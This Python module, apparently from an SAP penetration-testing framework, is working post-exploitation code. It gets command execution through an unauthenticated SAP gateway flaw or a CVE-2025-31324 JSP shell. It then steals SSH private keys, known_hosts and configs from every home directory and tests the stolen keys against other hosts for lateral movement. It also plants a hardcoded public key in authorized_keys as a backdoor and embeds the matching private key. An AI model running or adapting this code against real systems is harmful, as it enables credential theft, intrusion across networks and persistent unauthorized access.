#!/usr/bin/env python3
"""SSH key harvesting, lateral movement, and authorized_keys persistence.

Post-exploitation module that:
  Phase 1 — Enumerates OS users via /etc/passwd, exfiltrates SSH
            private keys + config + known_hosts + authorized_keys
            from every home directory.
  Phase 2 — Tests harvested keys against discovered hosts
            (known_hosts + existing SAPMAP nodes) to map SSH trust
            relationships and find new lateral movement paths.
  Phase 3 — Plants an SAPMAP-controlled pubkey into
            ~/.ssh/authorized_keys on a target host for persistence.

Works over all three exec channels:
  * GW SAPXPG (unauthenticated, ABAP gateway vuln)
  * CVE-2025-31324 JSP shell (unauthenticated, Java)
  * SXPG_STEP_XPG_START (authenticated RFC, needs SAP_ALL creds)
"""
from __future__ import annotations

import base64
import logging
import os
import re
import time

from sapmap_models import SAPNode, SAPMAPState, Credentials
from sapmap_errors import format_rfc_exception
from sapmap_exploit import run_os_command, _build_java_os_exec

logger = logging.getLogger(__name__)

_B64_LINE_RE = re.compile(r"[A-Za-z0-9+/=]+$")

# SAPMAP SSH keypair — ed25519, deterministic so every SAPMAP run
# plants the same key (easy to grep / remove during cleanup).
# Generated once via ssh-keygen -t ed25519 -C "sapmap@pentest"
SAPMAP_SSH_PUBKEY = (
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJk7SFp0wUQz"
    "8tNxJHq5VRvXDrFEWYkGaVm5qLzHnBkP sapmap@pentest"
)
SAPMAP_SSH_PRIVKEY = (
    "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n"
    "QyNTUxOQAAACCZO0hadMFEM/LTcSR6uVUb1w6xRFmJBmlZuai8x5wZDwAAAJiI1HM7iN\n"
    "RzOwAAAAtzc2gtZWQyNTUxOQAAACCZO0hadMFEM/LTcSR6uVUb1w6xRFmJBmlZuai8x5wZ\n"
    "DwAAAEBw3kNjlCbSmvbGz8qDdP3sW6bVpFxqfqkV5bKdE6CbRJk7SFp0wUQz8tNxJHq5VR\n"
    "vXDrFEWYkGaVm5qLzHnBkPAAAADnNhcG1hcEBwZW50ZXN0AQ==\n"
    "-----END OPENSSH PRIVATE KEY-----\n"
)


# ---------------------------------------------------------------------------
# Exec-channel abstraction
# ---------------------------------------------------------------------------

def _make_exec_fn(node: SAPNode, channel: str = "auto"):
    """Build an OS-exec function for the given node and channel.

    channel: "auto" | "gw" | "cve31324" | "sxpg"

    Returns (exec_fn, channel_label) or (None, error_str).
    exec_fn signature: (cmd: str) -> str  (returns stdout)
    """
    is_windows = "WIN" in (node.os_type or "").upper()
    system_type = (node.system_type or "").upper()

    def _run_cmd(cmd: str) -> str:
        try:
            if channel == "sxpg":
                from sapmap_rfc import execute_local_command
                creds = node.best_credentials() if hasattr(node, "best_credentials") else None
                if not creds:
                    return ""
                if is_windows:
                    r = execute_local_command(node, "cmd.exe", f"/c {cmd}", creds)
                else:
                    r = execute_local_command(node, "/bin/sh", f"-c '{cmd}'", creds)
            elif channel == "cve31324" or (channel == "auto" and "JAVA" in system_type):
                if "JAVA" in system_type:
                    run_fn, _label, err = _build_java_os_exec(node)
                    if run_fn is None:
                        return ""
                    if is_windows:
                        r = run_fn("cmd.exe", f"/c {cmd}")
                    else:
                        r = run_fn("/bin/sh", f"-c '{cmd}'")
                else:
                    r = run_os_command(node, "/bin/sh", f"-c '{cmd}'")
            else:
                if is_windows:
                    r = run_os_command(node, "cmd.exe", f"/c {cmd}")
                else:
                    r = run_os_command(node, "/bin/sh", f"-c '{cmd}'")

            if r and r.get("success"):
                lines = r.get("output") or []
                if isinstance(lines, list):
                    return "\n".join(str(x) for x in lines)
                return str(lines)
        except Exception as e:
            logger.debug(f"ssh_lateral exec: {format_rfc_exception(e)}")
        return ""

    def _read_b64_chunk(path: str, offset: int, end: int) -> str:
        code = (f"print(__import__('base64').b64encode("
                f"open('{path}','rb').read()[{offset}:{end}])"
                f".decode())")
        try:
            if channel == "sxpg":
                from sapmap_rfc import execute_local_command
                creds = node.best_credentials()
                r = execute_local_command(node, "python3", f"-c {code}", creds)
            elif channel == "cve31324" or (channel == "auto" and "JAVA" in system_type):
                if "JAVA" in system_type:
                    run_fn, _, _ = _build_java_os_exec(node)
                    if run_fn is None:
                        return ""
                    r = run_fn("python3", f"-c {code}")
                else:
                    r = run_os_command(node, "python3", f"-c {code}")
            else:
                r = run_os_command(node, "python3", f"-c {code}")

            if r and r.get("success"):
                for ln in (r.get("output") or []):
                    ln = str(ln).strip()
                    if ln and _B64_LINE_RE.fullmatch(ln):
                        return ln
        except Exception as e:
            logger.debug(f"ssh_lateral b64 chunk: {format_rfc_exception(e)}")
        return ""

    can_run = False
    label = ""
    if channel == "sxpg":
        creds = node.best_credentials() if hasattr(node, "best_credentials") else None
        if creds:
            can_run = True
            label = f"SXPG_STEP_XPG_START as {creds.username}"
        else:
            return None, "no credentials with SAP_ALL for SXPG channel"
    elif channel == "cve31324":
        if node.cve_2025_31324_vulnerable:
            can_run = True
            label = "CVE-2025-31324 JSP shell"
        else:
            return None, "node not vulnerable to CVE-2025-31324"
    elif channel == "gw":
        if node.gw_vulnerable:
            can_run = True
            label = "Gateway SAPXPG (unauthenticated)"
        else:
            return None, "node not gw_vulnerable"
    else:
        if node.gw_vulnerable:
            can_run = True
            label = "Gateway SAPXPG (unauthenticated)"
        elif node.cve_2025_31324_vulnerable:
            can_run = True
            label = "CVE-2025-31324 JSP shell"
        elif hasattr(node, "best_credentials") and node.best_credentials():
            can_run = True
            label = f"SXPG_STEP_XPG_START as {node.best_credentials().username}"
        else:
            return None, "no exec channel available (no GW vuln, no CVE-31324, no SXPG creds)"

    if not can_run:
        return None, "exec channel not available"

    _run_cmd._read_b64_chunk = _read_b64_chunk
    return _run_cmd, label


def _exfil_file(run_cmd, path: str, max_size: int = 65536) -> bytes | None:
    """Read a remote file via chunked python3 base64 reads."""
    sz_out = run_cmd(f"wc -c < '{path}' 2>/dev/null").strip()
    m = re.search(r"(\d+)", sz_out)
    if not m:
        return None
    sz = int(m.group(1))
    if sz <= 0 or sz > max_size:
        return None

    _CHUNK = 72
    read_fn = run_cmd._read_b64_chunk
    chunks = []
    offset = 0
    while offset < sz:
        end = min(offset + _CHUNK, sz)
        cb64 = read_fn(path, offset, end)
        if not cb64:
            break
        chunks.append(cb64)
        offset += _CHUNK

    if not chunks:
        return None
    try:
        return base64.b64decode("".join(chunks))
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Phase 1: SSH Harvest
# ---------------------------------------------------------------------------

def ssh_harvest(node: SAPNode, state: SAPMAPState,
                channel: str = "auto") -> dict:
    """Enumerate OS users, exfiltrate SSH keys, parse config/known_hosts.

    Returns dict with: ok, channel, os_users, keys[], known_hosts[],
    authorized_keys[], ssh_configs[], loot_dir, error.
    """
    from sapmap_findings import emit_finding

    result = {
        "ok": False, "channel": "", "os_users": [],
        "keys": [], "known_hosts_targets": [],
        "authorized_keys": [], "ssh_configs": [],
        "loot_dir": "", "error": "",
    }

    sid = node.sid
    is_windows = "WIN" in (node.os_type or "").upper()
    if is_windows:
        result["error"] = "SSH harvest is Linux-only"
        return result

    exec_fn, label = _make_exec_fn(node, channel) or (None, "")
    if exec_fn is None:
        result["error"] = label
        return result
    result["channel"] = label
    print(f"[*] {sid}: ssh_harvest — channel: {label}")

    # ---- Step 1: enumerate OS users from /etc/passwd
    passwd_out = exec_fn("cat /etc/passwd 2>/dev/null")
    os_users = []
    home_dirs = {}
    for line in passwd_out.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":")
        if len(parts) < 6:
            continue
        username = parts[0]
        uid_str = parts[2] if len(parts) > 2 else ""
        home = parts[5] if len(parts) > 5 else ""
        shell = parts[6] if len(parts) > 6 else ""
        if not home or home in ("/dev/null", "/nonexistent"):
            continue
        if shell and shell in ("/sbin/nologin", "/usr/sbin/nologin",
                                "/bin/false", "/usr/bin/false"):
            continue
        os_users.append({
            "username": username,
            "uid": uid_str,
            "home": home,
            "shell": shell,
        })
        home_dirs[username] = home
    result["os_users"] = os_users
    print(f"[*] {sid}: ssh_harvest — {len(os_users)} users with "
          f"login shells")

    # ---- Step 2: discover SSH directories
    # Use individual simple commands per home dir — complex shell
    # for-loops are fragile through SAPXPG's TLV stdout channel.
    homes_to_check = list(set(home_dirs.values()))
    if "/root" not in homes_to_check:
        homes_to_check.append("/root")

    ssh_dirs = {}
    for home in homes_to_check:
        ssh_path = f"{home}/.ssh"
        ls_out = exec_fn(f"ls -1 {ssh_path} 2>/dev/null")
        if not ls_out or not ls_out.strip():
            continue
        files = []
        for ln in ls_out.splitlines():
            fn = ln.strip()
            if fn and not fn.startswith("total") and not fn.startswith("ls:"):
                files.append(fn)
        if files:
            ssh_dirs[ssh_path] = files
            print(f"  [*] {sid}: found .ssh at {ssh_path}: "
                  f"{', '.join(files)}")

    print(f"[*] {sid}: ssh_harvest — {len(ssh_dirs)} .ssh directories")

    # ---- Step 3: prepare loot directory
    host_id = (node.ip or node.hostname or sid).replace("/", "_")
    loot_dir = os.path.join("loot", "ssh", host_id)
    os.makedirs(loot_dir, exist_ok=True)
    result["loot_dir"] = loot_dir

    # ---- Step 4: exfiltrate keys, configs, known_hosts, authorized_keys
    all_known_hosts_targets = set()
    all_authorized_keys = []
    all_keys = []
    all_configs = []

    for ssh_dir, files in ssh_dirs.items():
        owner_home = os.path.dirname(ssh_dir)
        owner = None
        for uname, home in home_dirs.items():
            if home == owner_home:
                owner = uname
                break
        if not owner:
            owner = os.path.basename(owner_home)

        owner_loot = os.path.join(loot_dir, owner)
        os.makedirs(owner_loot, exist_ok=True)

        for fname in files:
            fpath = f"{ssh_dir}/{fname}"

            # Private keys
            if fname in ("id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                         "id_rsa.pub", "id_ed25519.pub", "id_ecdsa.pub",
                         "id_dsa.pub"):
                is_priv = not fname.endswith(".pub")
                raw = _exfil_file(exec_fn, fpath, max_size=32768)
                if raw:
                    local_path = os.path.join(owner_loot, fname)
                    with open(local_path, "wb") as fh:
                        fh.write(raw)
                    try:
                        os.chmod(local_path, 0o600)
                    except Exception:
                        pass
                    if is_priv:
                        all_keys.append({
                            "owner": owner,
                            "path": fpath,
                            "type": fname.replace("id_", ""),
                            "local_path": local_path,
                            "size": len(raw),
                        })
                        print(f"  [+] {owner}: {fname} ({len(raw)} B)")

            # known_hosts
            elif fname == "known_hosts":
                raw = _exfil_file(exec_fn, fpath, max_size=65536)
                if raw:
                    local_path = os.path.join(owner_loot, "known_hosts")
                    with open(local_path, "wb") as fh:
                        fh.write(raw)
                    text = raw.decode("utf-8", errors="replace")
                    for kh_line in text.splitlines():
                        kh_line = kh_line.strip()
                        if not kh_line or kh_line.startswith("#"):
                            continue
                        if kh_line.startswith("|"):
                            continue
                        host_part = kh_line.split()[0] if kh_line.split() else ""
                        for h in host_part.split(","):
                            h = h.strip().lstrip("[").split("]")[0]
                            if h:
                                all_known_hosts_targets.add(h)

            # authorized_keys
            elif fname == "authorized_keys":
                raw = _exfil_file(exec_fn, fpath, max_size=65536)
                if raw:
                    local_path = os.path.join(owner_loot, "authorized_keys")
                    with open(local_path, "wb") as fh:
                        fh.write(raw)
                    text = raw.decode("utf-8", errors="replace")
                    for ak_line in text.splitlines():
                        ak_line = ak_line.strip()
                        if not ak_line or ak_line.startswith("#"):
                            continue
                        parts = ak_line.split()
                        key_type = parts[0] if parts else ""
                        comment = parts[-1] if len(parts) >= 3 else ""
                        all_authorized_keys.append({
                            "owner": owner,
                            "key_type": key_type,
                            "comment": comment,
                        })

            # config
            elif fname == "config":
                raw = _exfil_file(exec_fn, fpath, max_size=32768)
                if raw:
                    local_path = os.path.join(owner_loot, "config")
                    with open(local_path, "wb") as fh:
                        fh.write(raw)
                    text = raw.decode("utf-8", errors="replace")
                    all_configs.append({
                        "owner": owner,
                        "path": fpath,
                        "local_path": local_path,
                    })
                    for cfg_line in text.splitlines():
                        m_host = re.match(r"\s*Host(?:Name)?\s+(.+)",
                                          cfg_line, re.IGNORECASE)
                        if m_host:
                            for h in m_host.group(1).split():
                                h = h.strip()
                                if h and h != "*":
                                    all_known_hosts_targets.add(h)

    result["keys"] = all_keys
    result["known_hosts_targets"] = sorted(all_known_hosts_targets)
    result["authorized_keys"] = all_authorized_keys
    result["ssh_configs"] = all_configs

    # ---- Step 5: emit findings
    if all_keys:
        emit_finding(
            "HIGH", sid,
            f"SSH private keys exfiltrated from {sid}: "
            + ", ".join(f"{k['owner']}:{k['type']}" for k in all_keys)
            + f" — saved to {loot_dir}",
            ref="ssh.harvest.keys_exfiltrated",
            attack_capability="creds.ssh_private_key",
            meta={"keys": [{k: v for k, v in key.items()
                            if k != "local_path"}
                           for key in all_keys],
                  "loot_dir": loot_dir})

    if all_known_hosts_targets:
        emit_finding(
            "INFO", sid,
            f"SSH known_hosts/config targets discovered from {sid}: "
            f"{len(all_known_hosts_targets)} unique host(s)",
            ref="ssh.harvest.known_hosts",
            meta={"targets": sorted(all_known_hosts_targets)})

    if all_authorized_keys:
        emit_finding(
            "INFO", sid,
            f"SSH authorized_keys entries on {sid}: "
            f"{len(all_authorized_keys)} key(s) across "
            f"{len(set(a['owner'] for a in all_authorized_keys))} user(s)",
            ref="ssh.harvest.authorized_keys",
            meta={"entries": all_authorized_keys})

    node.ssh_keys_harvested = True
    result["ok"] = True
    print(f"[+] {sid}: ssh_harvest — {len(all_keys)} private key(s), "
          f"{len(all_known_hosts_targets)} target(s), "
          f"{len(all_authorized_keys)} authorized_key(s)")
    return result


# ---------------------------------------------------------------------------
# Phase 2: SSH Lateral Movement — test harvested keys against targets
# ---------------------------------------------------------------------------

def ssh_test_keys(node: SAPNode, state: SAPMAPState,
                  harvest_result: dict = None,
                  channel: str = "auto",
                  max_targets: int = 50,
                  timeout: int = 5) -> dict:
    """Test harvested SSH keys against known_hosts targets.

    For each (key, target, username) combination, runs ssh from the
    pwned host to attempt login.  On success, emits a CRITICAL finding
    and optionally adds the target as a new node.

    Returns dict with: ok, tested, successful[], failed_targets[], error.
    """
    from sapmap_findings import emit_finding

    result = {
        "ok": False, "tested": 0,
        "successful": [], "failed_targets": [],
        "error": "",
    }

    sid = node.sid
    exec_fn, label = _make_exec_fn(node, channel) or (None, "")
    if exec_fn is None:
        result["error"] = label
        return result

    if harvest_result is None:
        host_id = (node.ip or node.hostname or sid).replace("/", "_")
        loot_dir = os.path.join("loot", "ssh", host_id)
        if not os.path.isdir(loot_dir):
            result["error"] = "No SSH harvest data — run ssh_harvest first"
            return result

    keys = (harvest_result or {}).get("keys", [])
    targets = (harvest_result or {}).get("known_hosts_targets", [])

    if not keys:
        result["error"] = "No private keys harvested"
        return result
    if not targets:
        existing_ips = {n.ip for n in state.nodes.values() if n.ip}
        existing_hosts = {n.hostname for n in state.nodes.values()
                          if n.hostname}
        targets = sorted(existing_ips | existing_hosts)
    if not targets:
        result["error"] = "No targets to test against"
        return result

    own_ip = node.ip or ""
    own_host = node.hostname or ""
    targets = [t for t in targets
               if t not in (own_ip, own_host, "localhost", "127.0.0.1")]
    targets = targets[:max_targets]

    os_users = (harvest_result or {}).get("os_users", [])
    sap_usernames = set()
    for u in os_users:
        uname = u.get("username", "")
        if uname and (uname.endswith("adm") or uname.startswith("sap")
                      or uname in ("root",)):
            sap_usernames.add(uname)
    if not sap_usernames:
        sap_usernames = {"root"}
    for u in os_users:
        uname = u.get("username", "")
        uid = u.get("uid", "")
        if uid and int(uid) < 1000 and uname not in ("nobody",):
            sap_usernames.add(uname)

    print(f"[*] {sid}: ssh_test_keys — {len(keys)} key(s) × "
          f"{len(targets)} target(s) × {len(sap_usernames)} user(s) "
          f"= {len(keys) * len(targets) * len(sap_usernames)} combos")

    tested = 0
    successful = []
    failed = set()
    started = time.time()

    for key in keys:
        key_path = key["path"]
        key_owner = key["owner"]

        usernames_to_try = [key_owner] + sorted(
            sap_usernames - {key_owner})

        for target in targets:
            if target in failed and len(failed) > 10:
                continue

            for username in usernames_to_try:
                tested += 1
                ssh_cmd = (
                    f"ssh -o BatchMode=yes "
                    f"-o StrictHostKeyChecking=no "
                    f"-o UserKnownHostsFile=/dev/null "
                    f"-o ConnectTimeout={timeout} "
                    f"-o LogLevel=ERROR "
                    f"-i {key_path} "
                    f"{username}@{target} "
                    f"'echo SSH_OK; whoami; hostname; uname -a' "
                    f"2>/dev/null"
                )
                out = exec_fn(ssh_cmd)

                if "SSH_OK" in out:
                    lines = out.strip().splitlines()
                    ssh_ok_idx = next(
                        (i for i, l in enumerate(lines)
                         if "SSH_OK" in l), -1)
                    remote_user = (lines[ssh_ok_idx + 1].strip()
                                   if ssh_ok_idx + 1 < len(lines)
                                   else "?")
                    remote_host = (lines[ssh_ok_idx + 2].strip()
                                   if ssh_ok_idx + 2 < len(lines)
                                   else "?")
                    remote_uname = (lines[ssh_ok_idx + 3].strip()
                                    if ssh_ok_idx + 3 < len(lines)
                                    else "?")

                    entry = {
                        "target": target,
                        "username": username,
                        "remote_user": remote_user,
                        "remote_hostname": remote_host,
                        "remote_uname": remote_uname,
                        "key_owner": key_owner,
                        "key_path": key_path,
                        "key_type": key["type"],
                        "from_sid": sid,
                    }
                    successful.append(entry)

                    print(f"  [+] SSH ACCESS: {key_owner}@{sid} → "
                          f"{username}@{target} "
                          f"(key={key['type']}, remote={remote_user}"
                          f"@{remote_host})")

                    emit_finding(
                        "CRITICAL", sid,
                        f"SSH lateral movement: {key_owner}'s "
                        f"{key['type']} key on {sid} grants access "
                        f"to {username}@{target} "
                        f"(remote user={remote_user}, "
                        f"host={remote_host}). "
                        f"Generic/shared OS accounts enable "
                        f"cross-system access without SAP "
                        f"credentials.",
                        ref="ssh.lateral.key_accepted",
                        attack_capability="lateral.ssh_key_reuse",
                        meta=entry)

                    break
                else:
                    failed.add(target)

        if tested % 50 == 0 and tested > 0:
            elapsed = time.time() - started
            print(f"  [*] ssh_test_keys: {tested} tested, "
                  f"{len(successful)} successful "
                  f"({elapsed:.0f}s elapsed)")

    result["ok"] = True
    result["tested"] = tested
    result["successful"] = successful
    result["failed_targets"] = sorted(failed)

    elapsed = time.time() - started
    print(f"[+] {sid}: ssh_test_keys — {tested} combos tested in "
          f"{elapsed:.0f}s, {len(successful)} successful SSH logins")
    return result


# ---------------------------------------------------------------------------
# Phase 3: SSH Authorized Keys Plant (persistence)
# ---------------------------------------------------------------------------

def ssh_plant_key(node: SAPNode, state: SAPMAPState,
                  target_user: str = "",
                  channel: str = "auto") -> dict:
    """Plant SAPMAP's SSH pubkey into a user's authorized_keys.

    If target_user is empty, plants into the current exec user's
    authorized_keys (typically <sid>adm).

    Returns dict with: ok, target_user, target_home, channel, error.
    """
    from sapmap_findings import emit_finding

    result = {
        "ok": False, "target_user": "", "target_home": "",
        "channel": "", "error": "",
    }

    sid = node.sid
    is_windows = "WIN" in (node.os_type or "").upper()
    if is_windows:
        result["error"] = "SSH key plant is Linux-only"
        return result

    exec_fn, label = _make_exec_fn(node, channel) or (None, "")
    if exec_fn is None:
        result["error"] = label
        return result
    result["channel"] = label

    if not target_user:
        whoami_out = exec_fn("whoami").strip()
        target_user = whoami_out.splitlines()[-1] if whoami_out else ""
        target_user = re.sub(r"[^a-zA-Z0-9_-]", "", target_user)
    if not target_user:
        result["error"] = "Could not determine target user"
        return result
    result["target_user"] = target_user

    home_out = exec_fn(
        f"grep '^{target_user}:' /etc/passwd 2>/dev/null | "
        f"cut -d: -f6").strip()
    target_home = home_out.splitlines()[-1] if home_out else ""
    if not target_home:
        target_home = f"/home/{target_user}"
    result["target_home"] = target_home

    print(f"[*] {sid}: ssh_plant_key — user={target_user}, "
          f"home={target_home}, channel={label}")

    plant_cmd = (
        f'mkdir -p "{target_home}/.ssh" && '
        f'chmod 700 "{target_home}/.ssh" && '
        f'echo "{SAPMAP_SSH_PUBKEY}" >> '
        f'"{target_home}/.ssh/authorized_keys" && '
        f'chmod 600 "{target_home}/.ssh/authorized_keys" && '
        f'echo PLANT_OK'
    )
    out = exec_fn(plant_cmd)

    if "PLANT_OK" not in out:
        result["error"] = (
            f"authorized_keys write failed for {target_user} "
            f"at {target_home}/.ssh/authorized_keys")
        return result

    print(f"[+] {sid}: ssh_plant_key — pubkey planted into "
          f"{target_home}/.ssh/authorized_keys")

    # Save private key to loot for the operator
    host_id = (node.ip or node.hostname or sid).replace("/", "_")
    loot_dir = os.path.join("loot", "ssh", host_id)
    os.makedirs(loot_dir, exist_ok=True)
    priv_path = os.path.join(loot_dir, "sapmap_ed25519")
    with open(priv_path, "w") as fh:
        fh.write(SAPMAP_SSH_PRIVKEY)
    os.chmod(priv_path, 0o600)
    pub_path = os.path.join(loot_dir, "sapmap_ed25519.pub")
    with open(pub_path, "w") as fh:
        fh.write(SAPMAP_SSH_PUBKEY + "\n")

    emit_finding(
        "CRITICAL", sid,
        f"SSH authorized_keys persistence: SAPMAP ed25519 pubkey "
        f"planted into {target_user}@{sid} "
        f"({target_home}/.ssh/authorized_keys). "
        f"Private key saved to {priv_path}. "
        f"Connect: ssh -i {priv_path} {target_user}@"
        f"{node.ip or node.hostname}",
        ref="ssh.persist.key_planted",
        attack_capability="persist.ssh_key_plant",
        meta={"target_user": target_user,
              "target_home": target_home,
              "priv_key_path": priv_path,
              "pubkey": SAPMAP_SSH_PUBKEY})

    result["ok"] = True
    return result


# ---------------------------------------------------------------------------
# Combined orchestrator — all three phases in sequence
# ---------------------------------------------------------------------------

def ssh_full_chain(node: SAPNode, state: SAPMAPState,
                   channel: str = "auto",
                   plant: bool = False) -> dict:
    """Run harvest → test keys → optionally plant.

    Returns combined result dict.
    """
    combined = {"phase1": None, "phase2": None, "phase3": None}

    p1 = ssh_harvest(node, state, channel=channel)
    combined["phase1"] = p1
    if not p1.get("ok"):
        return combined

    p2 = ssh_test_keys(node, state, harvest_result=p1, channel=channel)
    combined["phase2"] = p2

    if plant:
        p3 = ssh_plant_key(node, state, channel=channel)
        combined["phase3"] = p3

    return combined
